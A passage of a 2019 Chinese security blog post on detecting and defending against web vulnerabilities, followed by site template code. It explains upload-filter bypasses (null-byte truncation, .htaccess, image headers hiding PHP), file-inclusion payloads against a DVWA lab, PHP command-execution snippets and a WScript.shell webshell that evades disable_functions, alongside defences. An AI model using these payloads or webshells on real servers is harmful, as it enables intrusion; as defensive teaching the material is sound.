+<p>描述：一个文件名为x1.x2.x3的文件，Apache 会从x3的位置往x1的位置开始尝试解析，如果x3不属于Apache能解析的扩展名，那么Apache会尝试去解析x2的位置，这样         一直往前尝试，直到遇到一个能解析的扩展名为止。</p>
+<p>2.IIS 解析漏洞：</p>
+<p>解析：test.asp/abc 或 test.asp;abc 名 或 abc/def.php （其中abc、def都为任意文件名）</p>
+<p>描述：IIS6.0在解析asp格式的时候有两个解析漏洞，一个是如果目录名包含”.asp”字符串，那么这个目录下所有的文件都会按照asp去解析，另一个是只要文件名中含有”.asp;”会优先按asp来解析；IIS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL 后面追加上字符串”/任意文件名.php”就会按照php的方式去解析。</p>
+<p>3.Nginx 解析漏洞：</p>
+<p>解析：abc/def.php 或 abc%00.php （其中abc、def都为任意文件名）</p>
+<p>描述：目前Nginx 主要有这两种漏洞，一个是对任意文件名，在后面添加/abc.php 的解析漏洞，如原本文件名是test.jpg则可以添加为test.jpg/x.php进行解析攻击。还有一种是对低版本的Nginx 可以在任意文件名后面添加%00.php 进行解析攻击。</p>
+<p>4.解析漏洞总结：</p>
+<p>Apache的扩展名顺序解析漏洞：Apache自身的漏洞</p>
+<p>IIS的asp 解析漏洞：IIS自身的漏洞</p>
+<p>Nginx的%00 解析漏洞：Nginx自身的漏洞</p>
+<p>php-cgi的默认配置漏洞：这类以CGI 形式调用php的web 应用程序主要出现在IIS和Nginx；而Apache 通常是以module 的形式去调用php，所以很少出现该类型漏洞。</p>
+<h2 id="三、检测方法"><a href="#三、检测方法" class="headerlink" title="三、检测方法"></a>三、检测方法</h2><p>简单点的方法就是直接上传各种类型的文件，再通过Burpsuite修改各个可以绕过的检测内容来检测。</p>
+<h2 id="四、防御方法"><a href="#四、防御方法" class="headerlink" title="四、防御方法"></a>四、防御方法</h2><p>简单的防御方法为：获取文件扩展名进行白名单对比，然后对文件进行重命名。当然若存在解析漏洞等容易被绕过，具体点的防御方法如下：</p>
+<p>1、客户端JavaScript检测：通常为检测文件扩展名)</p>
+<p>2、服务端MIME 类型检测：检测Content-Type内容)</p>
+<p>3、服务端目录路径检测：检测跟path参数相关的内容</p>
+<p>4、服务端文件扩展名检测：检测跟文件extension 相关的内容</p>
+<p>（1） 黑名单检测：</p>
+<ol>
+<li><p>文件名大小写绕过：如 AsP，pHp。</p>
+</li>
+<li><p>名单列表绕过：用黑名单里没有的名单，如 asa 或 cer 等。</p>
+</li>
+<li><p>特殊文件名绕过：比如发送的 http 包里把文件名改成 test.asp. 或 test.asp (后面为空格)，这种命名方式在 Windows系统里是不能直接修改的，需要在Burpsuite等代理中进行修改，然后绕过验证后，会被Windows系统自动去掉后面的点和空格，但也只能用在Windows系统中。</p>
+</li>
+<li><p>0x00 截断绕过</p>
+</li>
+<li><p>双扩展名解析绕过攻击：</p>
+</li>
+</ol>
+<p>(1)基于Web服务的解析逻辑：如果上传一个文件名为help.asp.123，扩展名123 不在扩展名黑名单中也没在Apache 可解析扩展名列表中，此时会向前搜寻下一个可解析的扩展名，若搜寻到.php，则会以php 执行。</p>
+<p>(2) 基于Web服务的解析方式：如果在Apache的conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是test2.php.jpg也会以php 来执行。</p>
+<ol start="6">
+<li><p>危险解析绕过攻击：基于Web服务的解析方式：如果在Apache 的conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是jpg，一样能以php 方式执行。</p>
+</li>
+<li><p>.htaccess 文件攻击：配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测。</p>
+</li>
+<li><p>解析调用/漏洞绕过：直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞</p>
+</li>
+</ol>
+<p>（2） 白名单检测：</p>
+<ol>
+<li><p>0x00 截断绕过：如test.asp%00.jpg 的方式进行截断，属于白名单文件，再利用服务端代码的检测逻辑漏洞进行攻击</p>
+</li>
+<li><p>解析调用/漏洞绕过：直接配合上传一个代码注入过的白名单文件，再利用解析调用/漏洞</p>
+</li>
+<li><p>.htaccess文件攻击：无论是黑名单还是白名单都可以直接攻击.htaccess 文件</p>
+</li>
+</ol>
+<p>如果PHP 安全没配置好，就可以通过move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的，这样就能任意定义解析名单了。</p>
+<p>5、服务端文件内容检测(检测内容是否合法或含有恶意代码) ：</p>
+<p>（1）文件幻数检测：</p>
+<p>主要是检测文件内容开始处的文件幻数，要绕过的话需要在文件开头写上检测的值，比如图片类型的文件幻数如下：</p>
+<p>JPG文件：</p>
+<p><img src="常见Web漏洞的检测与防御方法/3.png" alt="jpg文件幻数"></p>
+<p>GIF文件：</p>
+<p><img src="常见Web漏洞的检测与防御方法/4.png" alt="gif文件幻数"></p>
+<p>PNG文件：</p>
+<p><img src="常见Web漏洞的检测与防御方法/5.png" alt="png文件幻数"></p>
+<p>然后在文件幻数后面加上代码即可。</p>
+<p>（2）文件相关信息检测：</p>
+<p>图像文件相关信息检测常用的就是getimagesize()函数，需要把文件头部分伪造好，就是在幻数的基础上还加了一些文件信息，结构如下：</p>
+<p>GIF89a </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(...some binary data for image...) </span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure>
+<p>（3）文件加载检测：</p>
+<p>一般是调用API 或函数去进行文件加载测试，常见的是图像渲染测试，甚至是进行二次渲染（过滤效果几乎最强）。</p>
+<p>对渲染/加载测试的攻击方式：代码注入绕过，可以用图像处理软件对一张图片进行代码注入，但文件结构是完整的，渲染测试基本上都能绕过。用winhex查看数据可以分析出这类工具的原理是在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的注释区。</p>
+<p>对二次渲染的攻击方式：攻击文件加载器自身，常见的就是溢出攻击，上传恶意文件后服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode比如access/mdb 溢出；二次渲染相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了。</p>
+<p>示例代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">image_gd_open</span><span class="params">(file, extension)</span> </span>&#123; </span><br><span class="line">    extension = str_replace(<span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, extension); </span><br><span class="line">    open_func = <span class="string">'imageCreateFrom'</span>. extension; <span class="comment">//函数名变成imageCreateFrompng  之类 </span></span><br><span class="line">    <span class="keyword">if</span> (!function_exists($open_func)) &#123; </span><br><span class="line">    	<span class="keyword">return</span> <span class="keyword">FALSE</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> open_func(file); <span class="comment">//变成imagecreatefrompng('/tmp/php0lbTOn') </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="一、文件包含漏洞的利用技巧"><a href="#一、文件包含漏洞的利用技巧" class="headerlink" title="一、文件包含漏洞的利用技巧"></a>一、文件包含漏洞的利用技巧</h2><p>包含漏洞上传技巧：</p>
+<p>一般将一句话木马和图片进行绑定上传。</p>
+<p>包含读文件：</p>
+<p>如<a href="http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php">http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php</a></p>
+<p>包含写文件：</p>
+<p>构造URL：<a href="http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://input，并且提交POST数据为：">http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://input，并且提交POST数据为：</a>&lt;?php system(‘net user’);?&gt;等</p>
+<p>包含日志文件：</p>
+<p>当存在PHP本地文件包含漏洞，但无法上传正常文件时，可以利用Apache日志文件。Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中，例如：</p>
+<p><a href="http://10.10.10.128/dvwa/vulnerabilities/fi/?page=../../../../Apache-20\logs\access.log">http://10.10.10.128/dvwa/vulnerabilities/fi/?page=../../../../Apache-20\logs\access.log</a></p>
+<p>PHP内置的协议：</p>
+<p><img src="常见Web漏洞的检测与防御方法/2.png" alt="php伪协议"></p>
+<h2 id="二、检测方法-2"><a href="#二、检测方法-2" class="headerlink" title="二、检测方法"></a>二、检测方法</h2><p>找到有包含函数的页面，对函数内容进行替换查看结果；</p>
+<p>可以使用工具来代替手工的过程，如Kadimus、Burpsuite的插件LFI scanner checks等；</p>
+<p>白盒测试时，可以在源代码中查看allow_url_fopen、allow_url_include等敏感函数是否开启。</p>
+<h2 id="三、防御方法-2"><a href="#三、防御方法-2" class="headerlink" title="三、防御方法"></a>三、防御方法</h2><p>1、严格判断包含中的参数是否外部可控。</p>
+<p>2、路径限制，限制被包含的文件只能在某一个文件夹内，特别是一定要禁止目录跳转字符，如：“../”。</p>
+<p>3、基于白名单的包含文件验证，验证被包含的文件是否在白名单中。</p>
+<p>4、尽量不要使用动态包含，可以在需要包含的页面固定写好，如：“include(“head.php”)”。</p>
+<p>5、可以通过调用str_replace()函数实现相关敏感字符的过滤，一定程度上防御了远程文件包含。</p>
+<h1 id="不安全的验证码"><a href="#不安全的验证码" class="headerlink" title="不安全的验证码"></a>不安全的验证码</h1><h2 id="一、原理过程"><a href="#一、原理过程" class="headerlink" title="一、原理过程"></a>一、原理过程</h2><p>1.客户端发起一个请求</p>
+<p>2.服务端响应并创建一个新的 SessionID 同时生成一个随机验证码</p>
+<p>3.服务端将验证码和 SessionID 一并返回给客户端<br>4.客户端提交验证码连同 SessionID 给服务端</p>
+<p>5.服务端验证验证码同时销毁当前会话，返回给客户端结果</p>
+<h2 id="二、验证码的安全问题"><a href="#二、验证码的安全问题" class="headerlink" title="二、验证码的安全问题"></a>二、验证码的安全问题</h2><p>客户端问题：</p>
+<p>1、 客户端生成验证码：验证码由客户端 JS生成并且仅仅在客户端用JS验证。</p>
+<p>2、 验证码输出客户端：输出在HTML中，不应该把验证码的内容发送到客户端 cookie 或输出到response headers的其他字段中。</p>
+<p>3、 验证码输出在 cookie 中：有些系统默认不显示验证码，而是在用户校验错误一定次数之后再出现。那如何判断用户已经错误几次了呢？若是如下判断：        </p>
+<p>（1）在 cookie 中写入一个标记，比如 loginErr = 1，后续错误累加</p>
+<p>（2）在 session 中写入一个标记，例如 loginErr = 1，后续错误累加 </p>
+<p>这样问题在于，要是攻击者不带 Cookie 提交 HTTP 请求或不更新 Cookie中 loginErr 的值反复提交，这样程序会因为无从获取 Cookie/sessionID，会认为攻击者是首次访问，从而验证码不会出现。</p>
+<p>服务器端问题：</p>
+<p>1、 验证码不过期，没有及时销毁会话导致验证码复用</p>
+<p>2、 没有进行非空判断</p>
+<p>3、 产生的验证码问题集内的答案非常有限</p>
+<h2 id="三、检测方法-1"><a href="#三、检测方法-1" class="headerlink" title="三、检测方法"></a>三、检测方法</h2><p>简单的方法，先是手工登录几次，查看是否出现验证码以及验证码是否失效，然后再通过Burpsuite来进一步测试。</p>
+<h2 id="四、防御方法-1"><a href="#四、防御方法-1" class="headerlink" title="四、防御方法"></a>四、防御方法</h2><p>1、 强制要求输入验证码，否则必须实施 IP 策略。注意不要被 X-Forwarded-For（用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段） 绕过了。</p>
+<p>2、 验证码只能用一次，用完立即过期。</p>
+<p>3、 验证码强度增强，使用扭曲、变形、干扰线条、干扰背景色、变换字体等。</p>
+<p>4、 大网站最好统一安全验证码，各处使用同一个验证码接口。</p>
+<h1 id="命令注入漏洞"><a href="#命令注入漏洞" class="headerlink" title="命令注入漏洞"></a>命令注入漏洞</h1><h2 id="一、PHP与命令执行漏洞相关的函数"><a href="#一、PHP与命令执行漏洞相关的函数" class="headerlink" title="一、PHP与命令执行漏洞相关的函数"></a>一、PHP与命令执行漏洞相关的函数</h2><p>1、PHP的5种命令执行函数：system()、exec()、passthru()、shell_exec()、<code></code>运算符</p>
+<p>eval()函数注入攻击，将参数字符串作为PHP 程序代码来执行，用户可以将 PHP 代码保存成字符串的形式，然后传递给 eval 函数执行。</p>
+<p>PHP中的preg_replace()函数、str_replace()函数以及call_user_func()函数同样可以实现eval 注入攻击的效果。preg_replace()函数的作用是用来执行常规表达式的查找和替换的，当替换内容为用户可控数据时，就可能导致命令注入攻击漏洞的形成。</p>
+<p>2、命令执行小集：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">cmd=<span class="string">"system"</span>;</span><br><span class="line">ob_start(cmd);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"_GET[cunlide]"</span>;</span><br><span class="line">ob_end_flush();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">system(<span class="string">"GET[cunlide]"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"$GET[cunlide]"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> shell_exec(<span class="string">"_GET[cunlide]"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> passthru(<span class="string">"GET[cunlide]"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> `$GET[cunlide]`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>3、PHP后门木马常用的函数类型：</p>
+<p>执行系统命令：system, passthru, shell_exec, exec, popen, proc_open</p>
+<p>代码执行与加密：eval, assert, call_user_func,base64_decode, gzinflate, gzuncompress, gzdecode, str_rot13</p>
+<p>文件包含与生成：require，require_once，include,  include_once，file_get_contents, file_put_contents, fputs, fwrite<br>.htaccess：SetHandler, auto_prepend_file, auto_append_file</p>
+<h2 id="二、绕过disable-functions的方法"><a href="#二、绕过disable-functions的方法" class="headerlink" title="二、绕过disable_functions的方法"></a>二、绕过disable_functions的方法</h2><p>禁止 webshell 执行命令原理：PHP配置文件里的disable_functions =  配置，用来禁止某些 php 函数。</p>
+<p>1、 黑名单绕过</p>
+<p>2、 系统组件绕过（Windows）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">command=_POST[a];</span><br><span class="line">wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>);   <span class="comment">// 生成一个 COM 对象</span></span><br><span class="line">exec = wsh-&gt;exec(<span class="string">'cmd.exe /c '</span>.command); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line">stdout = exec-&gt;StdOut();</span><br><span class="line">stroutput = stdout-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> $stroutput</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Shell.Application 也可以实现同样的效果。</p>
+<p>彻底的解决方案是直接删除 System32 目录下 wshom.ocx 文件。</p>
+<p>3、 扩展库绕过：Linux下可通过编译拓展库进行绕过。</p>
+<p>防御方法：将dl函数加入disable_function中禁用。</p>
+<p>使用PHP突破Disable_functions执行Linux命令：linux 的 webshell 管理员禁用了exec，system，passthru，popen，shell_exec等等 PHP 执行命令函数，导致不能执行命令，php 提供了一个扩展模块功能，使用 dl 函数能包含一个扩展模块。类似.so或者想windows下的 dll 文件。可以自定义函数来调用 linux 命令而无视Disable_functions的限制。</p>
+<p>在PHP中使用create_function()创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给 create_function()执行任意命令。</p>
+<h2 id="三、检测方法-2"><a href="#三、检测方法-2" class="headerlink" title="三、检测方法"></a>三、检测方法</h2><p>基于黑盒的测试：简单点就是直接手工在输入内容之后添加各种分号或其它可以绕过的符号再添加命令，最后查看返回结果判断。</p>
+<p>基于白盒的测试：查看源代码，搜索与执行PHP代码的函数如eval、assert和执行系统命令的函数如system、passthru等。</p>
+<h2 id="四、防御方法-2"><a href="#四、防御方法-2" class="headerlink" title="四、防御方法"></a>四、防御方法</h2><p>1、尽量不要执行外部的应用程序或命令。</p>
+<p>2、使用自定义函数或函数库实现外部应用程序或命令的功能。</p>
+<p>3、在执行 system、eval 等命令执行功能的函数前，确定参数内容。</p>
+<p>4、使用 escapeshellarg ()函数和escapeshellcmd()函数处理相关用户输入的内容。escapeshellarg() 函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\’”，双引号“””会被转义为“\””，分号“ ;”会被转义为“\;”，这样 escapeshellarg 会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。escapeshellcmd()函数会转义内容中的所有shell元字符来进行防御，这些元字符包括：# $ ; , \ ‘ | ? * ~ &lt; &gt; ^ ( ) [ ] { } </p>
+<p>5、使用 safe_mode_exec_dir 执行可执行的文件路径。将 php.ini 文件中的 safe_mode 设置为 On，然后将允许执行的文件放入一个目录中，并使用 safe_mode_exec_dir 指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在 safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败。</p>
+<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="一、暴力破解分类"><a href="#一、暴力破解分类" class="headerlink" title="一、暴力破解分类"></a>一、暴力破解分类</h2><p>1、C/S架构暴力破解：</p>
+<p>主要使用的破解工具Hydra、Bruter、X-scan</p>
+<p>2、B/S架构暴力破解：</p>
+<p>使用Burpsuite镜像表单爆破</p>
+<h2 id="二、检测方法-3"><a href="#二、检测方法-3" class="headerlink" title="二、检测方法"></a>二、检测方法</h2><p>简单粗暴的方法，直接使用Burpsuite进行暴力破解，看看有没有什么防暴破的机制即可。</p>
+<h2 id="三、防御方法-3"><a href="#三、防御方法-3" class="headerlink" title="三、防御方法"></a>三、防御方法</h2><p>1、设置复杂的密码</p>
+<p>2、采用验证码机制，同时可防范CSRF攻击</p>
+<p>3、登陆日志，限制登录次数</p>
+<p>4、调用sleep()函数，当登录失败时停止一段时间才允许再次登录，如DVWA的High级的防暴破机制</p>
+<h1 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h1><p>待完善…</p>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>待完善…</p>
+<h1 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h1><p>待完善…</p>
+<h1 id="XPath注入"><a href="#XPath注入" class="headerlink" title="XPath注入"></a>XPath注入</h1><p>待完善…</p>
+<h1 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h1><p>待完善…</p>
+<h1 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h1><p>待完善…</p>
+<h1 id="URL不安全重定向"><a href="#URL不安全重定向" class="headerlink" title="URL不安全重定向"></a>URL不安全重定向</h1><p>待完善…</p>
+<h1 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h1><p>待完善…</p>
+<h1 id="HTML5安全"><a href="#HTML5安全" class="headerlink" title="HTML5安全"></a>HTML5安全</h1><p>待完善…</p>
+<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>待完善…</p>
+<h1 id="Web缓存攻击"><a href="#Web缓存攻击" class="headerlink" title="Web缓存攻击"></a>Web缓存攻击</h1><p>待完善…</p>
+</script></p>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    SKI12
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="http://yoursite.com/2019/01/30/常见Web漏洞的检测与防御方法/" title="常见Web漏洞的检测与防御方法">http://yoursite.com/2019/01/30/常见Web漏洞的检测与防御方法/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"><i class="fa fa-tag"></i> Web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/28/IA-32寄存器/" rel="next" title="IA-32（Intel Architecture 32位）寄存器">
+                <i class="fa fa-chevron-left"></i> IA-32（Intel Architecture 32位）寄存器
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/pain.jpg" alt="SKI12">
+            
+              <p class="site-author-name" itemprop="name">SKI12</p>
+              <p class="site-description motion-element" itemprop="description">No Pain, No Sec.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/SKI12" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https:/blog.csdn.net/ski_12" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-globe"></i>CSDN</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入与SQL盲注"><span class="nav-text">SQL注入与SQL盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、绕过WAF的方法"><span class="nav-text">一、绕过WAF的方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、检测方法"><span class="nav-text">二、检测方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、防御方法"><span class="nav-text">三、防御方法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS（跨站脚本）"><span class="nav-text">XSS（跨站脚本）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、检测方法"><span class="nav-text">一、检测方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、防御方法"><span class="nav-text">二、防御方法</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-smile-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">SKI12</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
